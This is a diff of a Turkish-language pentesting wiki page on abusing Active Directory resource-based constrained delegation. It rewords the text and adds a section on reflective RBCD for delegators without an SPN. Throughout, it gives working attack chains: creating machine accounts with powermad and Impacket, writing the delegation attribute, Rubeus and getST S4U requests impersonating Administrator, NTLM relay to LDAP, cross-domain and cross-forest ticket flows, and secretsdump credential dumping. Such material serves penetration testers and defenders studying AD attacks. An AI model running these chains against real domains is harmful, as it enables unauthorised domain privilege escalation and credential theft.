@@ -5,40 +5,40 @@
 
 ## Resource-based Constrained Delegation Temelleri
 
-Resource-based constrained delegation (RBCD), [constrained delegation](constrained-delegation.md) ile benzerdir, ancak güven yönü tersine çevrilmiştir. Geleneksel constrained delegation, bir principal'ın hangi servislere delegasyon yapabileceğini kaydeder; RBCD ise **hedef kaynağın** üzerinde, hangi principal'ların o kaynağa kullanıcıları taklit ederek erişebileceğini kaydeder.<sup>[[12]](#references)</sup>
+Resource-based constrained delegation (RBCD), [constrained delegation](constrained-delegation.md) yöntemine benzer, ancak güven yönü tersine çevrilmiştir. Geleneksel constrained delegation, bir principal'ın hangi servislere delegasyon yapabileceğini kaydeder; RBCD ise **hedef kaynakta**, hangi principal'ların o kaynağa kullanıcıları impersonate edebileceğini kaydeder.<sup>[[12]](#references)</sup>
 
-Hedef nesnenin _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ özniteliği, bu kaynakta başka kimlikler adına hareket etmesine izin verilen principal'ları belirten bir güvenlik tanımlayıcısı içerir.
+Hedef nesnenin _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ özniteliği, o kaynak için diğer kimlikler adına hareket etmesine izin verilen principal'ları tanımlayan bir security descriptor içerir.
 
-Bir diğer önemli fark, **bir makine hesabı üzerinde yazma izinlerine** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` ve benzeri haklar) sahip bir principal'ın _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ özniteliğini ayarlayabilmesidir. Geleneksel constrained delegation'ı yapılandırmak için genellikle daha ayrıcalıklı yönetici erişimi gerekir.<sup>[[1]](#references)</sup>
+Diğer önemli bir fark, **bir makine hesabı üzerinde yeterli write iznine** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` ve benzeri haklar) sahip bir principal'ın _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ özniteliğini ayarlayabilmesidir. Geleneksel constrained delegation'ı yapılandırmak için normalde daha ayrıcalıklı yönetici erişimi gerekir.<sup>[[1]](#references)</sup>
 
-Daha doğrusu, klasik constrained delegation ayarlarını değiştirmek için normalde bir etki alanı denetleyicisinde `SeEnableDelegationPrivilege` gerekir; bu hak genellikle yüksek ayrıcalıklı yöneticilerde bulunur. RBCD, kararı hedef nesnenin güvenlik tanımlayıcısına taşır; bu nedenle ilgili bilgisayar nesnesi özelliğine yazma erişimi, söz konusu kullanıcı hakkı olmadan yeterli olabilir.<sup>[[1]](#references)[[2]](#references)</sup>
+Daha kesin olarak, klasik constrained-delegation ayarlarını değiştirmek için genellikle bir domain controller üzerinde `SeEnableDelegationPrivilege` gerekir; bu hak normalde yüksek ayrıcalıklı yöneticilerde bulunur. RBCD, kararı hedef nesnenin security descriptor'ına bırakır. Bu nedenle ilgili computer-object özniteliğine write erişimi, söz konusu kullanıcı hakkı olmadan da yeterli olabilir.<sup>[[1]](#references)[[2]](#references)</sup>
 
 ### Yeni Kavramlar
 
-`userAccountControl` içindeki **`TrustedToAuthForDelegation`** bayrağı, genellikle **S4U2Self** için bir ön koşul olarak tanımlanır, ancak bu eksik bir açıklamadır.\
-SPN'ye sahip bir servis principal'ı, bu bayrak olmadan da S4U2Self isteğinde bulunabilir. `TrustedToAuthForDelegation` etkinse döndürülen servis bileti **forwardable** olur; etkin değilse bilet normalde **non-forwardable** olur.<sup>[[5]](#references)</sup>
+`userAccountControl` içindeki **`TrustedToAuthForDelegation`** flag'i genellikle **S4U2Self** için bir ön koşul olarak tanımlanır, ancak bu eksik bir açıklamadır.\
+SPN'si olan bir service principal, flag olmadan da S4U2Self isteğinde bulunabilir. `TrustedToAuthForDelegation` varsa döndürülen service ticket **forwardable** olur; yoksa ticket normalde **non-forwardable** olur.<sup>[[5]](#references)</sup>
 
-Geleneksel constrained delegation, S4U2Proxy adımında **non-forwardable bir TGS'yi** reddeder. RBCD ise hedefin güvenlik tanımlayıcısı istekte bulunan servise yetki veriyorsa bu S4U2Self biletini kabul edebilir.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>
+Geleneksel constrained delegation, S4U2Proxy adımında **non-forwardable bir TGS**'yi reddeder. RBCD ise hedefin security descriptor'ı istekte bulunan servise yetki veriyorsa bu S4U2Self ticket'ını kabul edebilir.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>
 
-### Saldırı yapısı
+### Saldırı Yapısı
 
-> Bir **bilgisayar hesabı** üzerinde **yazma eşdeğeri yetkilere** sahipseniz, o makine üzerinde ayrıcalıklı erişim elde edebilirsiniz.
+> Bir **computer account** üzerinde **write'a eşdeğer ayrıcalıklara** sahipseniz, o makineye ayrıcalıklı erişim elde edebilirsiniz.
 
-Saldırganın kurban bilgisayar nesnesi üzerinde zaten **yazma eşdeğeri yetkilere** sahip olduğunu varsayalım.
+Saldırganın kurban computer object üzerinde **write'a eşdeğer ayrıcalıklara** zaten sahip olduğunu varsayın.
 
-1. Saldırgan, **SPN**'si olan bir hesabı **ele geçirir** veya bir tane **oluşturur** ("Service A"). Varsayılan olarak, kimliği doğrulanmış bir etki alanı kullanıcısı **_MachineAccountQuota_** tarafından belirlenen en fazla 10 bilgisayar nesnesi oluşturabilir; bilgisayar nesnesi kullanılabilir SPN'leri otomatik olarak sağlar.
-2. Saldırgan, kurban bilgisayar (ServiceB) üzerindeki WRITE yetkisini **kötüye kullanarak**, **ServiceA'nın bu kurban bilgisayara (ServiceB) karşı herhangi bir kullanıcıyı taklit etmesine izin verecek şekilde resource-based constrained delegation'ı yapılandırır**.
-3. Saldırgan, Service A'dan Service B'ye, Service B'ye **ayrıcalıklı erişimi olan** bir kullanıcı için **tam bir S4U saldırısı** (S4U2Self ve S4U2Proxy) gerçekleştirmek üzere Rubeus kullanır.
-   1. S4U2Self (ele geçirilmiş veya oluşturulmuş SPN hesabından): **Administrator'ı Service A'ya temsil eden bir TGS** ister (non-forwardable).
-   2. S4U2Proxy: **non-forwardable TGS'yi** kullanarak kurban **host'a** **Administrator'ı** temsil eden bir servis bileti ister.
-   3. Service A, hedef kaynağın güvenlik tanımlayıcısında yetkili olduğundan, non-forwardable bilet bu RBCD akışında yine de çalışabilir.
-4. Saldırgan, **pass-the-ticket** yapabilir ve **kurban ServiceB'ye erişim kazanmak için** kullanıcıyı **taklit edebilir**.<sup>[[1]](#references)</sup>
+1. Saldırgan, **SPN**'si olan bir hesabı **ele geçirir** veya bir tane **oluşturur** ("Service A"). Varsayılan olarak, kimliği doğrulanmış bir domain kullanıcısı **_MachineAccountQuota_** tarafından belirlenen sınır uyarınca en fazla 10 computer object oluşturabilir; bir computer object otomatik olarak kullanılabilir SPN'ler sağlar.
+2. Saldırgan, Service A'nın kurban computer'a (ServiceB) karşı herhangi bir kullanıcıyı impersonate etmesine izin verecek şekilde **resource-based constrained delegation** yapılandırmak için kurban computer üzerinde sahip olduğu WRITE ayrıcalığını **kötüye kullanır**.
+3. Saldırgan, Service B'ye ayrıcalıklı erişimi **olan bir kullanıcı** için Service A'dan Service B'ye **tam bir S4U saldırısı** (S4U2Self ve S4U2Proxy) gerçekleştirmek üzere Rubeus kullanır.
+   1. S4U2Self (ele geçirilen veya oluşturulan SPN hesabından): Service A'ya Administrator'ı temsil eden bir **TGS** ister (non-forwardable).
+   2. S4U2Proxy: **non-forwardable TGS**'yi kullanarak kurban host'a **Administrator**'ı temsil eden bir service ticket ister.
+   3. Hedef kaynağın security descriptor'ında Service A'ya yetki verildiği için bu RBCD akışında non-forwardable ticket yine de çalışabilir.
+4. Saldırgan, kurban ServiceB'ye **erişim elde etmek** için **pass-the-ticket** yapabilir ve kullanıcıyı **impersonate edebilir**.<sup>[[1]](#references)</sup>
 
-`MachineAccountQuota=0`, varsayılan bilgisayar oluşturma yolunu kapatır; ancak hedef bilgisayar nesnesi üzerindeki yazma haklarını veya mevcut bir hesabın kontrolünü ortadan kaldırmaz. SPN'si olmayan, kontrolünüzdeki sıradan bir kullanıcı, aynı etki alanı içinde de, delegasyon yapan principal olarak bazen [SPN-less U2U yöntemi](#spn-less-cross-domain--cross-forest-rbcd) ile kullanılabilir. Bu yol yine de etkin bir RBCD yazma hakkı, delegasyon yapan kullanıcının kimlik bilgileri üzerinde kontrol, delegasyona uygun bir kimliğe bürünülecek kullanıcı, uyumlu Kerberos şifreleme davranışı ve hesabı aksatacak bir NT hash değişikliği gerektirir. Bunları ayrı ön koşullar olarak değerlendirin; RBCD özniteliğinin boş olması veya kotanın sıfır olması tek başına ne saldırının başarılı olacağını ne de ortamın güvenli olduğunu kanıtlar.
+`MachineAccountQuota=0`, varsayılan computer oluşturma yolunu kapatır; ancak hedef computer object üzerindeki write haklarını veya mevcut bir hesabın kontrolünü ortadan kaldırmaz. SPN'si olmayan, kontrol edilen sıradan bir kullanıcı bazen [SPN-less U2U yöntemi](#spn-less-cross-domain--cross-forest-rbcd) aracılığıyla delegasyon yapan principal olarak kullanılabilir; bu, tek bir domain içinde de mümkündür. Bu yol yine de etkili bir RBCD write hakkı, delegasyon yapan kullanıcının kimlik bilgileri üzerinde kontrol, impersonate edilen bir kimliğin delegasyona uygun olması, uyumlu Kerberos şifreleme davranışı ve hesabı aksatacak bir NT hash değişikliği gerektirir. Bunları birbirinden ayrı ön koşullar olarak değerlendirin; RBCD özniteliğinin boş olması veya kotanın sıfır olması tek başına ne başarının ne de güvenliğin kanıtıdır.
 
-Mevcut bir RBCD tanımlayıcısı, delegasyon yapan bilgisayarı doğrudan değil, bir **grubu** da belirtebilir. SPN taşıyan bir bilgisayar hesabını kontrol ediyor ve onu bu gruba ekleyebiliyorsanız, yeni üyelik hedef bilgisayarın RBCD özniteliğini değiştirmeden delegasyon yolunu sağlayabilir. Yolun işe yaradığı sonucuna varmadan önce grubun etkin üyelik yazma ACL'sini (deny ACE'ler dahil), iç içe grup üyeliklerini ve token yenilenmesini, tanımlayıcıdaki trustee SID'yi, kimliğine bürünülecek hesabın delegasyon kısıtlamalarını ve hedef servis SPN'sini kontrol edin.
+Mevcut bir RBCD descriptor'ı, delegasyon yapan computer'ı doğrudan belirtmek yerine bir **group** da belirtebilir. SPN'si olan bir computer account'u kontrol ediyorsanız ve onu bu group'a ekleyebiliyorsanız, yeni üyelik hedef computer'ın RBCD özniteliğini değiştirmeden delegasyon yolunu sağlayabilir. Bu yolun çalıştığı sonucuna varmadan önce group'un etkin üyelik-yazma ACL'sini (deny ACE'ler dahil), iç içe üyelikleri ve token yenilemeyi, descriptor'daki trustee SID'yi, impersonate edilen hesabın delegasyon kısıtlamalarını ve hedef service SPN'yi kontrol edin.
 
-Etki alanının _**MachineAccountQuota**_ değerini kontrol etmek için şunu kullanabilirsiniz:
+Domain'in _**MachineAccountQuota**_ değerini kontrol etmek için şunu kullanabilirsiniz:
 
 ```bash
 Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
@@ -48,7 +48,7 @@ Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select Ma
 
 ### Bilgisayar Nesnesi Oluşturma
 
-**[powermad](https://github.com/Kevin-Robertson/Powermad):** kullanarak etki alanında bir bilgisayar nesnesi oluşturabilirsiniz.<sup>[[3]](#references)[[4]](#references)</sup>
+**[powermad](https://github.com/Kevin-Robertson/Powermad):** kullanarak domain içinde bir bilgisayar nesnesi oluşturabilirsiniz<sup>[[3]](#references)[[4]](#references)</sup>
 
 ```bash
 import-module powermad
@@ -58,9 +58,9 @@ New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '
 Get-DomainComputer SERVICEA
 ```
 
-### Resource-based Constrained Delegation Yapılandırma
+### Resource-based Constrained Delegation'ı Yapılandırma
 
-**Active Directory PowerShell modülünü kullanma**<sup>[[4]](#references)</sup>
+**Active Directory PowerShell modülünü kullanarak**<sup>[[4]](#references)</sup>
 
 ```bash
 Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
@@ -84,33 +84,33 @@ msds-allowedtoactonbehalfofotheridentity
 {1, 0, 4, 128...}
 ```
 
-### Tam bir S4U attack gerçekleştirme (Windows/Rubeus)
+### Eksiksiz bir S4U attack gerçekleştirme (Windows/Rubeus)
 
-Öncelikle, `123456` parolasıyla yeni Computer nesnesini oluşturduk; bu nedenle bu parolanın hash'ine ihtiyacımız var:<sup>[[3]](#references)[[4]](#references)</sup>
+Öncelikle, parolası `123456` olan yeni Computer nesnesini oluşturduk; bu nedenle bu parolanın hash değerine ihtiyacımız var:<sup>[[3]](#references)[[4]](#references)</sup>
 
 ```bash
 .\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
 ```
 
-Bu, o hesap için RC4 ve AES hash'lerini yazdırır.\
+Bu, söz konusu hesap için RC4 ve AES hash'lerini yazdırır.\
 Şimdi saldırı gerçekleştirilebilir:<sup>[[3]](#references)[[4]](#references)</sup>
 
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
 ```
 
-Rubeus'un `/altservice` parametresini kullanarak tek seferde istekte bulunup daha fazla hizmet için daha fazla ticket oluşturabilirsiniz:
+Rubeus'un `/altservice` parametresini kullanarak yalnızca bir kez istekte bulunup daha fazla hizmet için daha fazla ticket oluşturabilirsiniz:
 
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
 ```
 
 > [!CAUTION]
-> Kullanıcılar **"Hesap hassastır ve delegasyona izin vermez."** olarak işaretlenebilir. Bu bayrak etkinse, bu delegation akışı üzerinden hesabın kimliğine bürünülemez. BloodHound analiz sırasında bu özelliği gösterir.
+> Kullanıcılar **"Hesap hassastır ve devredilemez."** olarak işaretlenebilir. Bu bayrak etkinse, bu delegation akışı üzerinden hesabın kimliğine bürünülemez. BloodHound analiz sırasında bu özelliği gösterir.
 
 ### Linux araçları: Impacket ile uçtan uca RBCD (2024+)
 
-Linux kullanıyorsanız, resmi Impacket araçlarını kullanarak tüm RBCD zincirini gerçekleştirebilirsiniz:<sup>[[6]](#references)[[7]](#references)</sup>
+Linux kullanıyorsanız, resmi Impacket araçlarını kullanarak RBCD zincirinin tamamını gerçekleştirebilirsiniz:<sup>[[6]](#references)[[7]](#references)</sup>
 
 ```bash
 # 1) Create attacker-controlled machine account (respects MachineAccountQuota)
@@ -131,18 +131,39 @@ impacket-secretsdump -k -no-pass Administrator@victim.domain.local
 
 Notlar
 - LDAP signing/LDAPS zorunluysa `impacket-rbcd -use-ldaps ...` kullanın.
-- AES keys kullanmayı tercih edin; birçok modern domain RC4'ü kısıtlar. Impacket ve Rubeus, yalnızca AES kullanılan akışları destekler.
-- Impacket bazı araçlarda `sname` değerini ("AnySPN") yeniden yazabilir, ancak mümkün olduğunda doğru SPN'yi edinin (ör. CIFS/LDAP/HTTP/HOST/MSSQLSvc).
+- AES keys kullanmayı tercih edin; birçok modern domain RC4'ü kısıtlar. Impacket ve Rubeus yalnızca AES kullanan akışları destekler.
+- Impacket bazı araçlar için `sname`'i ("AnySPN") yeniden yazabilir, ancak mümkün olduğunda doğru SPN'yi alın (ör. CIFS/LDAP/HTTP/HOST/MSSQLSvc).
 
-## Domainler arası ve forest'lar arası RBCD
+### SPN'siz, yalnızca Kerberos kullanan bir delegator için Reflective RBCD
 
-Kontrol ettiğiniz **delegating principal**, **resource computer**'dan **farklı bir domain**'de (hatta **farklı bir forest**'ta) bulunuyorsa, abuse yine **RBCD**'dir; ancak ticket akışı artık alışılmış tek-domain `S4U2Self -> S4U2Proxy` akışı değildir.
+**`msDS-AllowedToDelegateTo` olup SPN'si veya `TrustedToAuthForDelegation`'ı olmayan** ele geçirilmiş bir kullanıcı, sıradan S4U2Self ile [Kerberos-only constrained delegation](constrained-delegation.md#protocol-transition-vs-kerberos-only-constrained-delegation) için gereken forwardable evidence ticket'ı üretemez.<sup>[[1]](#references)[[18]](#references)</sup> Bu kullanıcı kendi AD object'i üzerinde RBCD yazabiliyorsa, saldırganın kontrolündeki, SPN'si olan bir hesap önce kullanıcıya delege edebilir.<sup>[[1]](#references)[[18]](#references)</sup> Bu RBCD adımı, taklit edilen kullanıcı için SPN'siz hesaba yönelik forwardable bir ticket sağlar; bu ticket, ele geçirilmiş hesabın klasik delegation allow-list'indeki bir SPN'ye yapılacak ikinci bir S4U2Proxy isteği için evidence olur.<sup>[[18]](#references)[[19]](#references)</sup>
 
-### Domainler arası RBCD: foreign principal'ı SID ile yapılandırma
+SPN'siz ilk adım için helper hesabın S4U2Proxy isteğinde **U2U** kullanılmalıdır: `enc-tkt-in-skey`, KDC'nin ticket'ı bir SPN key'i aramak yerine delegator'ın TGT session key'iyle şifrelemesini sağlar.<sup>[[18]](#references)[[19]](#references)</sup> KDC ayrıca `PA-PAC-OPTIONS` içindeki RBCD bitine, delegator'ın TGT'sine ve S4U2Self evidence ticket'ına ihtiyaç duyar.<sup>[[18]](#references)[[20]](#references)</sup> Yazarın Impacket `getST.py` fork'u bu istek için `-nospn` ve `-tgt` seçeneklerini ekler; `-nospn`/`-tgt` desteği upstream Impacket PR #2324'te bulunduğundan, stock `getST.py`'nin bu adımı desteklediğini varsaymak yerine bağlantıdaki fork'u kullanın.<sup>[[18]](#references)[[20]](#references)</sup>
 
-`msDS-AllowedToActOnBehalfOfOtherIdentity` değerini **farklı bir domain**'den ayarladığınızda, foreign machine/user hedef domain LDAP'ında **ismiyle çözümlenemeyebilir**. Bu durumda delegation girdisini sAMAccountName/UPN yerine foreign principal'ın **SID**'sini kullanarak yapılandırın.
+Bu örnekte `svc_web`'in ele geçirildiği, kendi RBCD attribute'unu yazabildiği ve `host/dc01.corp.local`'a delege etme izni olduğu varsayılır. Ayrıca SPN'si olan bir helper oluşturulabildiği, RC4'e izin verildiği ve seçilen `Administrator` hesabının delegable olduğu varsayılır. Ele geçirilen hesabın NT hash'ini kullanarak bir **RC4 TGT** isteyin. Yazarın fork'undaki **ilk** `getST.py`'yi çalıştırın; `describeTicket.py` çıktısını inceleyin ve aşağıda onun **RC4 TGT session key**'ini kullanın. Son `getST.py` stock Impacket olabilir. NT hash'ini değiştirmeden **önce** TGT isteğini gerçekleştirin; bu değişiklik, parolası sıfırlanana kadar service account'u aksatır.<sup>[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>
 
-Bu, özellikle NTLM'i LDAP'a `ntlmrelayx.py` ile relay ederken önemlidir:<sup>[[9]](#references)</sup>
+```bash
+pypykatz crypto nt 'OldPass!'
+getTGT.py -hashes ':<CURRENT_NT_HASH>' 'corp.local/svc_web' -dc-ip 10.0.0.10
+describeTicket.py svc_web.ccache
+addcomputer.py -computer-name 'HELPER$' -computer-pass 'HelperPass!' -dc-ip 10.0.0.10 'corp.local/svc_web:OldPass!'
+rbcd.py -delegate-from 'HELPER$' -delegate-to svc_web -action write -dc-ip 10.0.0.10 'corp.local/svc_web:OldPass!'
+changepasswd.py 'corp.local/svc_web:OldPass!@10.0.0.10' -newhashes ':<RC4_TGT_SESSION_KEY>'
+python3 ./getST.py -u2u -impersonate Administrator -nospn svc_web -tgt svc_web.ccache -dc-ip 10.0.0.10 'corp.local/HELPER$:HelperPass!'
+KRB5CCNAME=svc_web.ccache impacket-getST -impersonate Administrator -spn host/dc01.corp.local -additional-ticket 'Administrator@svc_web@CORP.LOCAL.ccache' -k -no-pass -dc-ip 10.0.0.10 'corp.local/svc_web'
+```
+
+Aşağıdaki [SPN-less RBCD yolundan](#spn-less-cross-domain--cross-forest-rbcd) farklı olarak bu zincirde SPN-less hesap önce **RBCD hedefi**, ardından **classic KCD delegator** olarak kullanılır. Yine de SPN’si olan ve kontrolünüzde bulunan başka bir hesap gerekir. `MachineAccountQuota=0` ise önceden kontrol edilen SPN’li bir hesap yeni bilgisayar hesabının yerini alabilir; tek başına sıfır kota bu yolu engellemez.<sup>[[18]](#references)[[19]](#references)</sup>
+
+## Cross-domain & cross-forest RBCD
+
+Kontrol ettiğiniz **delegating principal**, **resource computer** ile **farklı bir etki alanında** (hatta **farklı bir ormanda**) bulunuyorsa, kötüye kullanım yine **RBCD**’dir; ancak bilet akışı artık alışılagelen tek etki alanlı `S4U2Self -> S4U2Proxy` akışı değildir.
+
+### Cross-domain RBCD: yabancı principal'ı SID ile yapılandırma
+
+`msDS-AllowedToActOnBehalfOfOtherIdentity` özniteliğini **farklı bir etki alanından** ayarladığınızda, yabancı makine/kullanıcı hedef etki alanının LDAP’ında **adla çözümlenemeyebilir**. Bu durumda delegasyon girdisini sAMAccountName/UPN yerine yabancı principal’ın **SID**’sini kullanarak yapılandırın.
+
+Bu, özellikle `ntlmrelayx.py` ile NTLM’yi LDAP’a relay ederken önemlidir:<sup>[[9]](#references)</sup>
 
 ```bash
 sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
@@ -153,27 +174,27 @@ sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
 ```
 
 Notlar:
-- `--sid`, `ntlmrelayx.py` aracına `--escalate-user` değerini SID olarak ele almasını söyler; bu, yetki devreden hesap hedef etki alanının dışındaysa gereklidir.
-- Araç `User not found in LDAP` yazdırsa bile, güvenlik tanımlayıcısı yabancı SID'yi doğrudan sakladığından yetki devri yazma işlemi yine de başarılı olabilir.
+- `--sid`, `ntlmrelayx.py`'ye `--escalate-user` değerini SID olarak ele almasını söyler; delegasyon yapan hesap hedef etki alanının dışındaysa bu gereklidir.
+- Araç `User not found in LDAP` yazdırsa bile delegasyon yazma işlemi başarılı olabilir; çünkü güvenlik tanımlayıcısı yabancı SID'yi doğrudan depolar.
 
-### Etki alanları arası RBCD: realm'ler arası S4U dizisi
+### Etki alanları arası RBCD: cross-realm S4U sıralaması
 
-Yabancı asıl `msDS-AllowedToActOnBehalfOfOtherIdentity` içine eklendikten sonra, çalışan etki alanları arası akış şöyledir:<sup>[[9]](#references)[[13]](#references)</sup>
+Yabancı principal `msDS-AllowedToActOnBehalfOfOtherIdentity` içine eklendikten sonra, çalışan etki alanları arası akış şöyledir:<sup>[[9]](#references)[[13]](#references)</sup>
 
-1. Yetki devreden asıl için kendi etki alanından bir **TGT** alın.
-2. `krbtgt/<target-domain>` için bir **yönlendirme TGT'si** isteyin.
-3. Taklit edilen kullanıcı için hedef etki alanı DC'sinde realm'ler arası bir **S4U2Self yönlendirmesi** isteyin.
-4. Bu kullanıcı için gerçek **S4U2Self** biletini yetki devreden etki alanında isteyin.
-5. Hedef etki alanı için bir yönlendirme bileti almak üzere yetki devreden etki alanında **S4U2Proxy** işlemini gerçekleştirin.
+1. Delegasyon yapan principal için kendi etki alanından bir **TGT** alın.
+2. `krbtgt/<target-domain>` için bir **referral TGT** isteyin.
+3. Hedef etki alanı DC'sinde taklit edilen kullanıcı için bir **cross-realm S4U2Self referral** isteyin.
+4. Bu kullanıcı için asıl **S4U2Self** biletini delegasyon etki alanında tekrar isteyin.
+5. Hedef etki alanı için bir referral bileti almak üzere delegasyon etki alanında **S4U2Proxy** gerçekleştirin.
 6. `cifs/host.target`, `host/host.target` vb. için hizmet biletini almak üzere hedef etki alanı DC'sinde son **S4U2Proxy** işlemini gerçekleştirin.
 
-Linux'taki standart araçların etki alanları arası RBCD işlemlerinde sıklıkla başarısız olmasının nedeni budur:<sup>[[9]](#references)</sup>
-- istek **realm**'inin, `TGS-REQ` içinde kullanılan TGT'nin realm'inden farklı olması gerekebilir
-- zincir, yalnızca **S4U2Self** veya hemen ardından tek bir **S4U2Proxy** gelen **S4U2Self** değil, **birbirinden bağımsız S4U2Proxy adımları** gerektirir
+Bu nedenle standart Linux araçları etki alanları arası RBCD işlemlerinde genellikle başarısız olur:<sup>[[9]](#references)</sup>
+- İstekteki **realm** değerinin, `TGS-REQ` içinde kullanılan TGT'nin realm değerinden farklı olması gerekebilir.
+- Zincirde yalnızca **S4U2Self** veya hemen ardından tek bir **S4U2Proxy** işlemi değil, birbirinden bağımsız **S4U2Proxy adımları** gerekir.
 
 ### Linux'tan etki alanları arası RBCD
 
-Synacktiv, iki KDC'yi açıkça ele alarak Linux'tan realm'ler arası diziyi yeniden oluşturan bir Impacket `getST.py` uygulaması yayımladı:<sup>[[9]](#references)[[11]](#references)</sup>
+Synacktiv, iki KDC'yi açıkça ele alarak Linux'tan cross-realm sıralamasını yeniden oluşturan bir Impacket `getST.py` uygulaması yayımladı:<sup>[[9]](#references)[[11]](#references)</sup>
 
 ```bash
 python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
@@ -189,37 +210,37 @@ KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
 ```
 
 Operasyonel olarak yeni argümanlar şunlardır:
-- `-dc-ip`: **delegating** domain'in DC'si
-- `-targetdomain`: **resource computer**'ın domain'i
-- `-targetdc`: **resource** domain'in DC'si
+- `-dc-ip`: **delegating** domain’in DC’si
+- `-targetdomain`: **resource computer**’ın domain’i
+- `-targetdc`: **resource** domain’in DC’si
 
-### Cross-forest RBCD sınırlamaları
+### Forest'lar arası RBCD sınırlamaları
 
-Cross-forest RBCD'nin önemli bir sınırlaması vardır: **impersonate edilen kullanıcı, delegating principal ile aynı forest'a ait olmalıdır**. Başka bir deyişle, kontrol ettiğiniz makine hesabı `valhalla.local` içindeyse ve hedef resource `asgard.local` içindeyse, genellikle RBCD üzerinden o resource'a erişmek için istediğiniz `asgard.local` kullanıcılarını impersonate **edemezsiniz**.<sup>[[9]](#references)</sup>
+Forest'lar arası RBCD’nin önemli bir sınırlaması vardır: **impersonate edilen kullanıcı, delegating principal ile aynı forest’a ait olmalıdır**. Başka bir deyişle, kontrol ettiğiniz makine hesabı `valhalla.local` içindeyse ve hedef resource `asgard.local` içindeyse, RBCD aracılığıyla bu resource’a erişirken genellikle rastgele `asgard.local` kullanıcılarını impersonate **edemezsiniz**.<sup>[[9]](#references)</sup>
 
 Şu durumlarda yine de istismar edilebilir:
-- **delegating forest** kullanıcısı, diğer forest'taki resource host üzerinde **local admin** ise (veya başka bir şekilde ayrıcalıklıysa)
-- Bir trust gerekli authentication yoluna izin veriyorsa ve hedef bilgisayarın security descriptor'ında yabancı SID kabul ediliyorsa
+- **delegating forest** kullanıcısı, diğer forest’taki resource host’ta **local admin** (veya başka bir şekilde ayrıcalıklı) ise
+- bir trust gerekli kimlik doğrulama yoluna izin veriyorsa ve hedef bilgisayarın security descriptor’ında yabancı SID kabul ediliyorsa
 
-### Cross-forest RBCD protokolündeki incelikler
+### Forest'lar arası RBCD protokolündeki tuhaflıklar
 
-Cross-forest RBCD, yalnızca "cross-domain ve bir trust" meselesi değildir. Gözlemlenen akışta, yaygın araçların tarihsel olarak gözden kaçırdığı iki incelik bulunur:<sup>[[9]](#references)</sup>
+Forest'lar arası RBCD, yalnızca "trust ile birlikte cross-domain" değildir. Gözlemlenen akışta, yaygın araçların geçmişte gözden kaçırdığı iki tuhaflık bulunur:<sup>[[9]](#references)</sup>
 
 1. **`PA-PAC-OPTIONS=branch-aware`** ayarlayan ek bir **S4U2Proxy** isteği
-2. Diğer etype'lar istenmiş olsa bile son service ticket'ın **RC4** kullanılarak döndürülebilmesi
+2. Diğer etype’lar istenmiş olsa bile, son service ticket’ın **RC4** kullanılarak döndürülebilmesi
 
-Uygulamadaki akış şöyledir:
+Pratik akış şöyledir:
 
-1. Forest A'daki delegating principal için bir TGT alın.
-2. Forest A'da impersonate edilecek kullanıcı için **S4U2Self** isteğinde bulunun.
-3. Forest B için bir referral TGT almak üzere Forest A'da **S4U2Proxy** isteğinde bulunun.
-4. Forest B için başka bir referral TGT almak üzere Forest A'da, S4U2Self ticket'ını additional ticket olarak **kullanmadan**, ancak `branch-aware` etkin durumdayken ikinci bir **S4U2Proxy** isteği gönderin.
-5. İsteğe bağlı olarak Forest B'de delegating principal için normal bir service ticket isteyin (son istismar için bu ticket gerekli değildir).
-6. Impersonate edilen Forest A kullanıcısı adına hedef SPN'ye yönelik son **S4U2Proxy** ticket'ını istemek için 3. ve 4. adımlarda alınan referral ticket'larını Forest B'de kullanın.
+1. Forest A’daki delegating principal için bir TGT alın.
+2. Forest A’da impersonate edilecek kullanıcı için **S4U2Self** isteği gönderin.
+3. Forest A’da **S4U2Proxy** isteği göndererek Forest B için bir referral TGT alın.
+4. Forest A’da, S4U2Self ticket’ını additional ticket olarak eklemeden, ancak `branch-aware` etkinleştirilmiş şekilde ikinci bir **S4U2Proxy** isteği göndererek Forest B için başka bir referral TGT alın.
+5. İsteğe bağlı olarak Forest B’de delegating principal için normal bir service ticket isteyin (bu ticket son istismar için gerekli değildir).
+6. Hedef SPN’ye, impersonate edilen Forest A kullanıcısı için Forest B’de son **S4U2Proxy** ticket’ını istemek üzere 3. ve 4. adımlardaki referral ticket’larını kullanın.
 
-### Linux'tan Cross-forest RBCD
+### Linux'tan forest'lar arası RBCD
 
-Aynı Synacktiv Impacket branch'i bu mantık için `-forest` seçeneği ekler:<sup>[[9]](#references)[[11]](#references)</sup>
+Aynı Synacktiv Impacket branch’i bu mantık için `-forest` seçeneğini ekler:<sup>[[9]](#references)[[11]](#references)</sup>
 
 ```bash
 python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
@@ -232,15 +253,15 @@ python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
   -forest
 ```
 
-### Özyinelemeli çok etki alanlı RBCD (3+ etki alanı)
+### Recursive multi-domain RBCD (3+ etki alanı)
 
